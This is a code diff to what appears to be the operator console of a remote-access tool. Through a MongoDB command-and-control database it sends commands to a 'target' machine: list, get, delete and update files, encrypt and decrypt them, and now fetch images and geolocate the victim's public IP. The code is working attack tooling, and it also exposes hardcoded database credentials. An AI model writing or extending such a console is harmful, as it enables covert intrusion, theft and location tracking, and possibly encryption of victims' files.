@@ -2,6 +2,7 @@ import pymongo
 import json
 from PIL import Image as im
 import numpy as np
+import requests
 
 con = "mongodb+srv://utsav:utsav@cluster0.rqeuq69.mongodb.net/?retryWrites=true&w=majority"
 
@@ -9,22 +10,58 @@ client = pymongo.MongoClient(con,tls=True,tlsAllowInvalidCertificates=True)
 
 db=client['shell']
 
-MY_COMMANDS=['dir','cd','cd..','deletefile','createfile','renamefile','getfile','mkdir','rmdir','updatefile','disks','encrypt','decrypt']
+MY_COMMANDS=['dir','cd','cd..','deletefile','createfile','renamefile','getfile','getimg','mkdir','rmdir','updatefile','disks','encrypt','decrypt','targetinfo']
 
 CWD=r""
 LAST_PATH=""
 TARGET=""
 IP=""
+PUBLIC_IP=""
 PREV_COMMAND=""
 SHELL_RESULT=False
 
+def targetInfo():
+    global PUBLIC_IP
+    if PUBLIC_IP:
+        response = requests.get(f'http://ip-api.com/json/{PUBLIC_IP}').json()
+        try:
+            city=response.get("city")
+            region=response.get("regionName")
+            country=response.get("country")
+            public_ip=PUBLIC_IP
+            lat=response.get("lat")
+            lon=response.get("lon")
+            isp=response.get('isp')
+            location_data =[
+            f"Public_IP --> {public_ip}",
+            f"city --> {city}",
+            f"region --> {region}" ,
+            f"country --> {country}",
+            f"Latitude --> {lat}",
+            f"Longitude --> {lon}",
+            f"Internet Service Provider --> {isp}"
+            ]
+            print(">>> ")
+            for i in location_data:
+                print(i)
+            print()
+        except:
+            print(">>> ")
+            print("Something went wrong!!!")
+    else:
+        print(">>> ")
+        print("No Public IP Found!!!")
+        
+    
+
 def getTargetMachine():
-    global TARGET,IP
+    global TARGET,IP,PUBLIC_IP
     col=db['systemInfo']
     x=col.find_one()
     if x:
         TARGET=x['hostname']
         IP=x['ip']
+        PUBLIC_IP=x['public_ip']
         return x['hostname'],x['ip']
     else:
         TARGET='None'
@@ -131,6 +168,8 @@ def ActionUploader():
         except Exception as e:
                 print(e)
         
+    elif a[0]=='targetinfo':
+        targetInfo()
     
     else:
         if a[0] not in ['cd','cd..','exit','e','quit','q','commands']:
@@ -148,10 +187,12 @@ def ActionUploader():
                 "target_string":"",
                 "process_taken":0
                 }
-            elif len(a)==3:
+            elif len(a)>=3:
                 if a[0]=='updatefile':
                     target_element=a[1]
-                    target_string=a[2]
+                    target_string=""
+                    for i in range(2,len(a)):
+                        target_string=target_string+a[i]+" "
                     data={
                         "action":action,
                         "target":target,
